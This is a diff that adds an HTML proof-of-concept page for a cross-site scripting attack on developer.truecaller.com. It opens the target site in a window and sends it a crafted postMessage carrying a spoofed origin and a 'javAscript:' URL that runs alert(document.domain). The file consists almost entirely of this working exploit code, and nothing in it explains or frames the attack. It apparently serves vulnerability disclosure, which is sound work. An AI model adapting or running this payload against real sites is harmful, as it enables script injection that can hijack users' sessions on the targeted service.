@@ -1,0 +1,28 @@
+<html>
+
+<body>
+
+<button onclick="open_truecaller()">click me to open developer.truecaller.com</button>
+<button onclick="simple_alert()">click me for simple xss</button>
+<script>
+async function open_truecaller() {
+
+win_attcker = window.open("https://developer.truecaller.com/?ctActionMode=ctBuilder");
+
+}
+
+function simple_alert() {
+win_attcker.postMessage({
+"originUrl": "https://vflx.github.io",
+"url": "javAscript:alert(document.domain)//",
+"variant": true,
+"message": "Dashboard",
+"evtMaster": [{}],
+"details": "test",
+"personalisation": "test"
+}, "*")
+}
+</script>
+</body>
+
+</html>
